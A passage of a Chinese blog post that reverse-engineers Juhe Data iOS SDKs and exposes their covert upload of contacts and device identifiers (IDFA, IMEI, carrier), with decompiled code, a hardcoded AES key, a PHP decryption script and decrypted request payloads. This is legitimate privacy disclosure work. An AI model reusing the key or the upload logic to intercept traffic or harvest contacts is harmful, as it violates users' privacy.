[bp-28h]@5</span></span><br><span class="line">  <span class="keyword">int</span> v34; <span class="comment">// [sp+74h] [bp-24h]@5</span></span><br><span class="line">  <span class="keyword">int</span> v35; <span class="comment">// [sp+78h] [bp-20h]@5</span></span><br><span class="line">  <span class="keyword">int</span> (__cdecl *v36)(<span class="keyword">int</span>, <span class="keyword">int</span>); <span class="comment">// [sp+7Ch] [bp-1Ch]@5</span></span><br><span class="line">  <span class="keyword">int</span> v37; <span class="comment">// [sp+80h] [bp-18h]@5</span></span><br><span class="line">  <span class="keyword">int</span> v38; <span class="comment">// [sp+84h] [bp-14h]@5</span></span><br><span class="line"></span><br><span class="line">  v26 = objc_retain(a3);</span><br><span class="line">  v25 = objc_retain(a4);</span><br><span class="line">  v22 = objc_retain(a5);</span><br><span class="line">  v24 = objc_retain(a6);</span><br><span class="line">  v6 = objc_msgSend(classRef_JHOpenidSupplier, selRef_shareSupplier);</span><br><span class="line">  v7 = (<span class="keyword">void</span> *)objc_retainAutoreleasedReturnValue(v6);</span><br><span class="line">  v8 = v7;</span><br><span class="line">  v9 = objc_msgSend(v7, selRef_getLatestJuheAPIOpenId);</span><br><span class="line">  v23 = objc_retainAutoreleasedReturnValue(v9);</span><br><span class="line">  objc_release(v8);</span><br><span class="line">  v10 = objc_msgSend(classRef_NSUserDefaults, selRef_standardUserDefaults);</span><br><span class="line">  v11 = (<span class="keyword">void</span> *)objc_retainAutoreleasedReturnValue(v10);</span><br><span class="line">  v12 = v11;</span><br><span class="line">  v13 = objc_msgSend(v11, selRef_objectForKey_, CFSTR(<span class="string">"ujc"</span>));</span><br><span class="line">  v14 = (<span class="keyword">void</span> *)objc_retainAutoreleasedReturnValue(v13);</span><br><span class="line">  objc_release(v12);</span><br><span class="line">  <span class="keyword">if</span> ( !v14 || !(<span class="keyword">unsigned</span> __int8)objc_msgSend(v14, selRef_isEqualToString_, CFSTR(<span class="string">"1"</span>)) )</span><br><span class="line">    objc_msgSend(</span><br><span class="line">      classRef_JHHTTPClient,</span><br><span class="line">      selRef_initJHHTTPClient_OpenId_Path_URLRoot_Method_Key_Success_Failure_,</span><br><span class="line">      <span class="number">4</span>,</span><br><span class="line">      v23,</span><br><span class="line">      CFSTR(<span class="string">"initialize"</span>),</span><br><span class="line">      CFSTR(<span class="string">"http://sdk.juhe.cn"</span>),</span><br><span class="line">      CFSTR(<span class="string">"POST"</span>),</span><br><span class="line">      CFSTR(<span class="string">"z@J:70=o*O%~!8-i"</span>),</span><br><span class="line">      &amp;__block_literal_global67,</span><br><span class="line">      &amp;__block_literal_global69);</span><br><span class="line">  v21 = v14;</span><br><span class="line">  v15 = objc_msgSend(self, selRef_calibrateParameters_api_, v25, v26);</span><br><span class="line">  v16 = objc_retainAutoreleasedReturnValue(v15);</span><br><span class="line">  v17 = objc_msgSend(classRef_JHHTTPClient, selRef_sharedJuHeHTTPClient);</span><br><span class="line">  v18 = objc_retainAutoreleasedReturnValue(v17);</span><br><span class="line">  v19 = v22;</span><br><span class="line">  <span class="keyword">if</span> ( v18 )</span><br><span class="line">  &#123;</span><br><span class="line">    v33 = _NSConcreteStackBlock;</span><br><span class="line">    v34 = -<span class="number">1040187392</span>;</span><br><span class="line">    v35 = <span class="number">0</span>;</span><br><span class="line">    v20 = v18;</span><br><span class="line">    v36 = __57__JuheAPI_executeWorkWithAPI_parameters_success_failure___block_invoke_3;</span><br><span class="line">    v37 = (<span class="keyword">int</span>)&amp;<span class="keyword">__block_descriptor_t</span>mp76;</span><br><span class="line">    v38 = objc_retain(v22);</span><br><span class="line">    v27 = _NSConcreteStackBlock;</span><br><span class="line">    v19 = v22;</span><br><span class="line">    v28 = -<span class="number">1040187392</span>;</span><br><span class="line">    v29 = <span class="number">0</span>;</span><br><span class="line">    v30 = __57__JuheAPI_executeWorkWithAPI_parameters_success_failure___block_invoke77;</span><br><span class="line">    v31 = (<span class="keyword">int</span>)&amp;<span class="keyword">__block_descriptor_t</span>mp80;</span><br><span class="line">    v32 = objc_retain(v24);</span><br><span class="line">    objc_msgSend(</span><br><span class="line">      classRef_JHHTTPClient,</span><br><span class="line">      selRef_sendEncryptData_URLRoot_Data_Method_Key_Success_Failure_,</span><br><span class="line">      CFSTR(<span class="string">"/api"</span>),</span><br><span class="line">      CFSTR(<span class="string">"http://sdk.juhe.cn"</span>),</span><br><span class="line">      v16,</span><br><span class="line">      CFSTR(<span class="string">"GET"</span>),</span><br><span class="line">      CFSTR(<span class="string">"z@J:70=o*O%~!8-i"</span>),</span><br><span class="line">      &amp;v33,</span><br><span class="line">      &amp;v27);</span><br><span class="line">    objc_release(v32);</span><br><span class="line">    objc_release(v38);</span><br><span class="line">    v18 = v20;</span><br><span class="line">  &#125;</span><br><span class="line">  objc_release(v18);</span><br><span class="line">  objc_release(v16);</span><br><span class="line">  objc_release(v21);</span><br><span class="line">  objc_release(v23);</span><br><span class="line">  objc_release(v24);</span><br><span class="line">  objc_release(v19);</span><br><span class="line">  objc_release(v25);</span><br><span class="line">  objc_release(v26);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以清楚的看到，这里并没有判断是否是调用的短信 API，而判断的是有没有拿到通讯录，有的话，上传。</p>
<p>另外，就算是像他们所说的 <code>方便短信api用户</code>：嗯我们把他曲解成和开发者共享用户隐私好啦，聚合数据的后台里也没有能看到的地方呀那你到底方便的是谁呐～</p>
<p>呐，拿到加密方式和密钥，解密也就很容易啦：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env php</span></span><br><span class="line"><span class="preprocessor">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decrypt</span><span class="params">(<span class="variable">$data</span>)</span> </span>&#123;</span><br><span class="line">  <span class="variable">$method</span> = <span class="string">'AES-128-ECB'</span>;</span><br><span class="line">  <span class="variable">$password</span> = <span class="string">'z@J:70=o*O%~!8-i'</span>;</span><br><span class="line">  <span class="variable">$data</span> = hex2bin(<span class="variable">$data</span>);</span><br><span class="line">  <span class="keyword">return</span> mcrypt_decrypt(MCRYPT_RIJNDAEL_128, <span class="variable">$password</span>, <span class="variable">$data</span>, MCRYPT_MODE_ECB);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$data</span> = trim(file_get_contents(<span class="string">'php://stdin'</span>));</span><br><span class="line"><span class="keyword">echo</span> decrypt(<span class="variable">$data</span>);</span><br></pre></td></tr></table></figure>
<p>现在我们来解密它发送的三个请求：</p>
<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET /initapi?0EF3CC39DB8ED6938DC<span class="number">47B2D626</span>F4D1FAEA274211EB1A8FC1490F7FA0BFCD28ACE<span class="number">887174D7C22</span>BAE74DB<span class="number">70A6197552</span>C<span class="number">58E48B39A41</span>B<span class="number">4C798B82</span>E44F34F9EDCE<span class="number">1C3A92E1</span>BC<span class="number">679C91D87</span>CBD598CC36C52AA<span class="number">00294A748</span>DCCE0DF<span class="number">84704E73D00</span>C<span class="number">6A7B8299</span>ED6ED<span class="number">854906B3</span>E<span class="number">72C1028873</span>F7E8FBF<span class="number">1C38A799</span>E059C80AD<span class="number">0A76836C8</span>FB3CA9B410DC<span class="number">41B30394F76</span>CFF4FD321783EDE69D322CA8658FF982E7BD77FAF<span class="number">69C7D79833</span>8B01BC62AAD<span class="number">9F20C42664</span>2ABE4E6B8DCDDE379ECA<span class="number">2F5188990</span>E2F9FB0E9489AEB47955DC00DE2AD<span class="number">752F06B6</span>BAA18141CBB<span class="number">1C047356</span>D41A8984EE<span class="number">16790C1C18</span>C<span class="number">765A46B86</span>25FCC<span class="number">9E08C3A98</span>1226F7BC31422DF0CF<span class="number">446789B80</span>8A9003AD73133CCE<span class="number">0A2C79B38</span>EB1A4D92FCF8FBB<span class="number">0C47186418</span>D2EF<span class="number">55E96D2569</span>D544AB84983EB<span class="number">013C2A5</span>FD3B1EBC5EE<span class="number">6234652</span>FE4ABBDE85FE<span class="number">04B5A6372</span>A4004AD74622 HTTP/1.1</span><br><span class="line">Host: sdk.juhe.cn</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en<span class="comment">;q=1</span></span><br><span class="line">Connection: keep-alive</span><br><span class="line">User-Agent: JuheApisDemo/1 (iPhone<span class="comment">; iOS 8.1; Scale/2.00)</span></span><br></pre></td></tr></table></figure>
<p>解密后是一串 querystring，为了看得更清楚一些我这里以 JSON 的格式显示：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">   <span class="string">"idfa"</span> : <span class="string">"13D66220-D133-4145-8D60-4A1CC99C0178"</span>,</span><br><span class="line">   <span class="string">"lat"</span> : <span class="string">"0.000000"</span>,</span><br><span class="line">   <span class="string">"model"</span> : <span class="string">"iPhone"</span>,</span><br><span class="line">   <span class="string">"lon"</span> : <span class="string">"0.000000"</span>,</span><br><span class="line">   <span class="string">"pname"</span> : <span class="string">"com.thinkland.JuheApisDemo"</span>,</span><br><span class="line">   <span class="string">"sim"</span> : <span class="string">"中国电信"</span>,</span><br><span class="line">   <span class="string">"imei"</span> : <span class="string">"48d34682f03f55be46b953bd5e2111c14c0c5e9a"</span>,</span><br><span class="line">   <span class="string">"os"</span> : <span class="string">"8.1"</span>,</span><br><span class="line">   <span class="string">"openid"</span> : <span class="string">"JH1a5e42462c03dbec36c224c33fa0be65"</span>,</span><br><span class="line">   <span class="string">"network"</span> : <span class="string">"CTRadioAccessTechnologyCDMAEVDORevA"</span>,</span><br><span class="line">   <span class="string">"type"</span> : <span class="string">"iPhone OS"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>发送了我的 IDFA、位置、手机型号、运营商、IMEI、系统版本和网络制式。其中位置信息由于没有请求位置权限，所以显示的是 0.000000。</p>
<p>这里的都还好，下一个请求：<br><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="request">POST <span class="string">/initialize</span> HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span>: <span class="string">sdk.juhe.cn</span></span><br><span class="line"><span class="attribute">Accept</span>: <span class="string">*/*</span></span><br><span class="line"><span class="attribute">Accept-Encoding</span>: <span class="string">gzip, deflate</span></span><br><span class="line"><span class="attribute">Content-Length</span>: <span class="string">3040</span></span><br><span class="line"><span class="attribute">Content-Type</span>: <span class="string">application/x-www-form-urlencoded; charset=utf-8</span></span><br><span class="line"><span class="attribute">Accept-Language</span>: <span class="string">en;q=1</span></span><br><span class="line"><span class="attribute">Connection</span>: <span class="string">keep-alive</span></span><br><span class="line"><span class="attribute">User-Agent</span>: <span class="string">JuheApisDemo/1 (iPhone; iOS 8.1; Scale/2.00)</span></span><br><span class="line"></span><br><span class="line"><span class="dns">73AA9E8CBE5FCFDF<span class="number">120F9C4E3</span>ADA11E5098FE158DA<span class="number">50A604D3</span>E3F22D31DFFBDD806962BCC8DD56CC<span class="number">691F11C72</span><span class="number">525983C6</span>D<span class="number">0259878085</span>EF<span class="number">80988D6493</span>A7977BD3E8AB<span class="number">0F802D54</span>E81DDC38DF<span class="number">4D1B30526</span>857EFE953AE6BE9729EDDA125CFFCE686BEB<span class="number">010E79E64</span><span class="number">6E75507B21</span>F<span class="number">15C838019</span>D1AB170B39BE4BD<span class="number">115A988B15</span>E<span class="number">51D0D569</span>B1CC<span class="number">2C3B34B41</span><span class="number">91756906065</span>E<span class="number">05D8B0F32</span>4CE47DA85F29BC3CE88D1A3FD<span class="number">2D9D861</span>CDED<span class="number">624387A70</span>C<span class="number">0B4F774212</span><span class="keyword">A</span><span class="number">9E6153C148</span>427BB<span class="number">5B4371C90</span>71FC<span class="number">19B04A5088</span>F27CF<span class="number">599B48677</span>D<span class="number">0D86104486</span>FE4DAB<span class="number">8B125A6B16</span>BABB0810BCB2B855ADA<span class="number">41F9110D0</span>FA<span class="number">7B84C2E28</span>3545DC1281FC149BBE<span class="number">809B9C90</span><span class="number">8F34596635</span><span class="number">1211F168363</span>253677BE<span class="number">2E0702331</span>C<span class="number">19B9545A5</span>F8297EA<span class="number">564E085</span>BEF3B4D4CDB3A974BD<span class="number">92A02766564</span><span class="number">9F9772A09</span><span class="number">5F436C26</span>C<span class="number">4348E482</span>BC78DC9F08B39EE0D8E7EE<span class="number">4F3108189</span>E2F1FB<span class="number">7B4A902</span>CCE<span class="number">70C281733</span>F0312AE<span class="number">23B954D92</span>A4E4B8BFF<span class="number">9E696A114</span>BE3F1AEBC<span class="number">54308906271</span>0894AF<span class="number">433C0592</span>F6AB<span class="number">22E234D64C73</span>54EF<span class="number">33A9161E3</span>B3ECEEE<span class="number">61D973D4</span>E7AA9EDF38FCF19848AF<span class="number">388198C7C4</span>B<span class="number">521E81709</span>F8DDE<span class="number">72C242C34405</span>F<span class="number">715A56362</span>4AD55BF5325BCF<span class="number">4885937D79</span>C572FBDFA9D8FEE<span class="number">7F813E05</span>6CF2BAC50CEFE8086E8CA9DE<span class="number">848F0D1</span>CEFA<span class="number">4F176387</span>EE<span class="number">77F81109</span>CE602AD<span class="number">64B1C9577</span>B<span class="number">91F301D6</span>BEA16E2F01CD5BB<span class="number">81268C72307</span><span class="number">585C26183</span>E471DC<span class="number">2E58A19A7</span>CFBE<span class="number">713E40F58</span>B34EC<span class="number">796920F98</span><span class="number">28616F4D5</span>E<span class="number">681616C2</span>A5FB13BED991BE<span class="number">158D4817</span>CBC90EEED<span class="number">88B0D776</span>B36206AF919D92CBE748209AA64EDB<span class="number">889B01394</span>9DE<span class="number">263D2501</span>E38C017BAB46BD43F6B0CA084FDDAEDB<span class="number">962E56D93</span>5FB<span class="number">3A6142F6</span>B1A8A3DCDFFC45E20FCEC6AB<span class="number">362A9D04</span>DE99D75CCF<span class="number">4C83F9934</span><span class="keyword">A</span><span class="number">82B013B32</span><span class="number">42459F8B9</span>CEF<span class="number">4567780</span>FDC35FA45B3CB<span class="number">15047D26</span>DF<span class="number">994869C26</span>E<span class="number">6E4688A2</span>A54CC61B87CE<span class="number">69821F0B1</span>DA<span class="number">768C0530</span>A4E74B7AF<span class="number">11647C51C202</span><span class="number">85130168190</span>E<span class="number">10F799E12</span><span class="keyword">A</span><span class="number">69C87919E33</span><span class="number">78F2D8E3</span>ED0B4BE<span class="number">136E84A084</span>E20F94F6EC<span class="number">8587310E38</span>724A00DA<span class="number">5F039B79</span>3EF9C5B0DB3EE1EB<span class="number">8B593197E9</span>B52B7862FEE0EEE6E742BD635644CED0CED<span class="number">33809B556</span>CD7AC5390CB<span class="number">018652C3</span>FF<span class="number">8D0145A70</span>4FA62E9EB<span class="number">669B68754</span>B09BD<span class="number">04A20E0D0</span>EA<span class="number">13104257B43</span><span class="number">7E195347833</span>CE<span class="number">9023D392</span>EC<span class="number">0E94E8A46</span>3C0766BEEF623CF94F6EC<span class="number">8587310E38</span>724A00DA<span class="number">5F039B72</span>6DE<span class="number">1C55C9A76</span>8460D9DCFAD1A60BBF<span class="number">36B0D6B18</span><span class="keyword">A</span><span class="number">57A4B725</span>BDE71093EB<span class="number">8A8E9B59</span><span class="number">3100C272</span>D<span class="number">9B12596210</span>DBCD8AC19AAFF<span class="number">55A224C561</span>C3AF8705B6FCA<span class="number">7583D895</span>E2CCEBE8AA14B6FD90044FE<span class="number">182157303675</span>4EE03624BD<span class="number">10D23257F06</span>436735AA<span class="number">5179C5E74</span>DF92FFCA0C6AF<span class="number">61E1256F7</span>CE<span class="number">8E348A8</span>DD4706DF4FC<span class="number">52A54098D38</span>791434CA45E1693DBFDE<span class="number">6639715</span>CDD18FB35D8DE5FC57CFC9C2AAC<span class="number">28987574748</span>7EDCCB<span class="number">050E6F70</span>0B36DD<span class="number">04074833</span>DAA3CA9C3ADB15C3552AFE488352ADA4E2FB3FD3B63C8BE<span class="number">2A38296092</span>EA<span class="number">1F6D26F84</span>B5B46ED65AE90DFD<span class="number">8D21D7D78</span><span class="number">49A2F5480</span>E50922CC<span class="number">47C9E4316</span>E<span class="number">7B52E706</span>EC<span class="number">9B30C0041</span>F64DD<span class="number">3241F3E8</span>FFFDF<span class="number">32D6C4B8</span>DC4FD1A27ED1DEE1EA<span class="number">68123F513</span>CE<span class="number">09F886224E115</span>83A3FAF<span class="number">063D48E5</span>CD<span class="number">35D67C8142</span>EA206AAF0A8ECBA<span class="number">1123157C24E126</span>A6CAB<span class="number">35917C36861</span><span class="number">29D39D9A14</span>DFF<span class="number">323D81561</span>0E29DE3B5EDA91CD91EDE67DCAC<span class="number">51728F5</span>CD199C5CDFA4D618DA<span class="number">05027665649</span>F<span class="number">9772A095</span>F<span class="number">436C26C43</span>48E41DFEB<span class="number">2E75104959</span><span class="number">2775469D52</span><span class="number">996E7629</span>E2F1FB<span class="number">7B4A902</span>CCE<span class="number">70C281733</span>F<span class="number">0312A26E60</span>6DAEE06EF6AA<span class="number">3861F58F56</span>D66E07BEC6D2CCA<span class="number">7448216A4</span>B<span class="number">0A634282</span>C11DDC<span class="number">4F17F26B0</span>B<span class="number">976992F90</span><span class="number">221843744E6</span>F<span class="number">7E1E4690</span>D797ED<span class="number">65297B276</span>B5E6BD<span class="number">5232284</span>CA<span class="number">56B21F5A80</span>6DAEF<span class="number">23840169D61</span>6471EE<span class="number">50B4410227</span>FD485CC<span class="number">05F64C33D43</span><span class="number">7E833B4</span>D31661ECB<span class="number">89A8F5D3</span><span class="keyword">A</span><span class="number">1C42572936</span><span class="number">9D205F628</span>BC<span class="number">39B18E5057</span>DEB<span class="number">364D66195</span>54E66FC97A874BF0F15FE<span class="number">6D1B856</span>FF<span class="number">906E8462</span>DCCECBD958A4FE<span class="number">80647298</span>AFE<span class="number">00F2A640</span>D519FFF81AA3DEF<span class="number">742827D62</span><span class="number">7E04B3B55</span><span class="number">7D8F899</span>FFEECA<span class="number">8D6E3E98</span>DE<span class="number">406026B64</span>AC<span class="number">040C0377</span>F<span class="number">9479296E6</span>BC9647C3DF<span class="number">34405F2D69</span>EBC<span class="number">4957D0C65</span><span class="number">6E0C77929</span>96FABF85BD<span class="number">4462C1F29</span>53EDE69D322CA8658FF982E7BD77FAF69130AD<span class="number">757016D7</span>D<span class="number">982E51B01</span><span class="number">3A967F19</span>B</span></span><br></pre></td></tr></table></figure></p>
<p>解密后是一串格式化过的 JSON，说起来真是浪费空间呐，虽然有 gzip 也不要这样子嘛：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">   <span class="string">"idfa"</span> : <span class="string">"13D66220-D133-4145-8D60-4A1CC99C0178"</span>,</span><br><span class="line">   <span class="string">"type"</span> : <span class="string">"iPhone OS"</span>,</span><br><span class="line">   <span class="string">"pname"</span> : <span class="string">"com.thinkland.JuheApisDemo"</span>,</span><br><span class="line">   <span class="string">"sim"</span> : <span class="string">"中国电信"</span>,</span><br><span class="line">   <span class="string">"lon"</span> : <span class="string">""</span>,</span><br><span class="line">   <span class="string">"list"</span> : [</span><br><span class="line">      &#123;</span><br><span class="line">         <span class="string">"disPlayName"</span> : <span class="string">"DoeJoe"</span>,</span><br><span class="line">         <span class="string">"listNoteinfo"</span> : [</span><br><span class="line">            &#123;</span><br><span class="line">               <span class="string">"noteinfo"</span> : <span class="string">""</span></span><br><span class="line">            &#125;</span><br><span class="line">         ],</span><br><span class="line">         <span class="string">"listAddress"</span> : [</span><br><span class="line">            &#123;</span><br><span class="line">               <span class="string">"street"</span> : <span class="string">""</span>,</span><br><span class="line">               <span class="string">"city"</span> : <span class="string">""</span>,</span><br><span class="line">               <span class="string">"region"</span> : <span class="string">""</span>,</span><br><span class="line">               <span class="string">"postCode"</span> : <span class="string">""</span>,</span><br><span class="line">               <span class="string">"formatAddress"</span> : <span class="string">"&#123;\n    City = Suzhou;\n    Country = China;\n    CountryCode = cn;\n    State = Jiangsu;\n    Street = \"Each St\\nChangwan\";\n    ZIP = 215000;\n&#125;"</span></span><br><span class="line">            &#125;</span><br><span class="line">         ],</span><br><span class="line">         <span class="string">"contactId"</span> : <span class="string">"1"</span>,</span><br><span class="line">         <span class="string">"listEmail"</span> : [</span><br><span class="line">            &#123;</span><br><span class="line">               <span class="string">"emailType"</span> : <span class="string">""</span>,</span><br><span class="line">               <span class="string">"emailValue"</span> : <span class="string">"spyware@spyware.tld"</span></span><br><span class="line">            &#125;</span><br><span class="line">         ],</span><br><span class="line">         <span class="string">"listPhone"</span> : [</span><br><span class="line">            &#123;</span><br><span class="line">               <span class="string">"phoneType"</span> : <span class="string">"iOS"</span>,</span><br><span class="line">               <span class="string">"phoneNumber"</span> : <span class="string">" (0) 21110"</span></span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">               <span class="string">"phoneNumber"</span> : <span class="string">" (0) 10110"</span>,</span><br><span class="line">               <span class="string">"phoneType"</span> : <span class="string">"iOS"</span></span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">               <span class="string">"phoneType"</span> : <span class="string">"iOS"</span>,</span><br><span class="line">               <span class="string">"phoneNumber"</span> : <span class="string">" (0) 1012315"</span></span><br><span class="line">            &#125;</span><br><span class="line">         ],</span><br><span class="line">         <span class="string">"listNickname"</span> : [</span><br><span class="line">            &#123;</span><br><span class="line">               <span class="string">"nickname"</span> : <span class="string">""</span></span><br><span class="line">            &#125;</span><br><span class="line">         ],</span><br><span class="line">         <span class="string">"listOrganizations"</span> : [</span><br><span class="line">            &#123;</span><br><span class="line">               <span class="string">"company"</span> : <span class="string">"Spyware Technologies LLC"</span>,</span><br><span class="line">               <span class="string">"title"</span> : <span class="string">""</span></span><br><span class="line">            &#125;</span><br><span class="line">         ]</span><br><span class="line">      &#125;</span><br><span class="line">   ],</span><br><span class="line">   <span class="string">"imei"</span> : <span class="string">"48d34682f03f55be46b953bd5e2111c14c0c5e9a"</span>,</span><br><span class="line">   <span class="string">"model"</span> : <span class="string">"iPhone"</span>,</span><br><span class="line">   <span class="string">"openid"</span> : <span class="string">"JH1a5e42462c03dbec36c224c33fa0be65"</span>,</span><br><span class="line">   <span class="string">"lat"</span> : <span class="string">""</span>,</span><br><span class="line">   <span class="string">"network"</span> : <span class="string">"CTRadioAccessTechnologyCDMAEVDORevA"</span>,</span><br><span class="line">   <span class="string">"os"</span> : <span class="string">"8.1"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>不用我再多说啥了吧？我给份对照表大家慢慢看。</p>
<p>由于里面的英文表达的不准确、大小写位置也有不正确的，可能引起强迫症患者不适，不过原文如此，我也没办法啦～</p>
<table>
<thead>
<tr>
<th>Parent key</th>
<th>Key</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>-</td>
<td>disPlayName</td>
<td>显示名称</td>
</tr>
<tr>
<td>listNoteinfo</td>
<td>noteinfo</td>
<td>联系人备注</td>
</tr>
<tr>
<td>listAddress</td>
<td>street</td>
<td>住址：街道</td>
</tr>
<tr>
<td>listAddress</td>
<td>city</td>
<td>住址：城市</td>
</tr>
<tr>
<td>listAddress</td>
<td>region</td>
<td>住址：省份</td>
</tr>
<tr>
<td>listAddress</td>
<td>postCode</td>
<td>住址：邮编</td>
</tr>
<tr>
<td>listAddress</td>
<td>formatAddress</td>
<td>格式化后的住址</td>
</tr>
<tr>
<td>-</td>
<td>contactId</td>
<td>联系人 ID</td>
</tr>
<tr>
<td>listEmail</td>
<td>emailType</td>
<td>E-mail 类型</td>
</tr>
<tr>
<td>listEmail</td>
<td>emailValue</td>
<td>E-mail 地址</td>
</tr>
<tr>
<td>listPhone</td>
<td>phoneType</td>
<td>电话号码类型</td>
</tr>
<tr>
<td>listPhone</td>
<td>phoneNumber</td>
<td>电话号码</td>
</tr>
<tr>
<td>listNickname</td>
<td>nickname</td>
<td>昵称</td>
</tr>
<tr>
<td>listOrganizations</td>
<td>company</td>
<td>公司</td>
</tr>
<tr>
<td>listOrganizations</td>
<td>title</td>
<td>职位</td>
</tr>
</tbody>
</table>
<h3 id="短信验证码_SDK_(iOS_SDK_v1-0-1)">短信验证码 SDK (iOS SDK v1.0.1)</h3><p>以下的我都偷懒直接 strings 大法好了：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># strings SMSSDKDemo/SMSSDK.framework/SMSSDK | grep -i SMSAddressBook</span></span><br><span class="line">uploadSMSAddressBook</span><br><span class="line">initSMSAddressBook:</span><br><span class="line">getSMSAddressBook:</span><br><span class="line">getSMSAddressBookJsonString:</span><br><span class="line">SMSAddressBook</span><br><span class="line">uploadSMSAddressBook</span><br><span class="line">initSMSAddressBook:</span><br><span class="line">getSMSAddressBook:</span><br><span class="line">getSMSAddressBookJsonString:</span><br><span class="line">SMSAddressBook</span><br><span class="line">uploadSMSAddressBook</span><br><span class="line">initSMSAddressBook:</span><br><span class="line">getSMSAddressBook:</span><br><span class="line">getSMSAddressBookJsonString:</span><br><span class="line">SMSAddressBook</span><br></pre></td></tr></table></figure></p>
<p>这个版本最诚实，<code>uploadSMSAddressBook</code> 就直接当函数名了啊哈哈～</p>
<h3 id="条码数据_SDK_(iOS_SDK_v1-0-2)">条码数据 SDK (iOS SDK v1.0.2)</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># strings Barcode_iOSSDK_v1.2/barcode/demoBarcode/JuheBarcode.framework/Versions/A/JuheBarcode | grep -i SMSAddressBook</span></span><br><span class="line">initSMSAddressBook:</span><br><span class="line">getSMSAddressBook:</span><br><span class="line">getSMSAddressBookJsonString:</span><br></pre></td></tr></table></figure>
<p>会上传。</p>
<h3 id="比价数据_SDK_(iOS_SDK_v1-0-0)">比价数据 SDK (iOS SDK v1.0.0)</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># strings bijia.sdk.v1.0/JuhePrice.framework/Versions/A/JuhePrice| grep -i SMS</span></span><br></pre></td></tr></table></figure>
<p>没有。</p>
<h3 id="电商数据_SDK_(iOS_SDK_v1-0-0)">电商数据 SDK (iOS SDK v1.0.0)</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># strings dianshang.sdk.v1.0/JuheEBusiness.framework/Versions/A/JuheEBusiness | grep -i SMS</span></span><br></pre></td></tr></table></figure>
<p>没有。</p>
<h3 id="聚合基站_(2-3-4)">聚合基站 (2.3.4)</h3><p>会上传通讯录。</p>
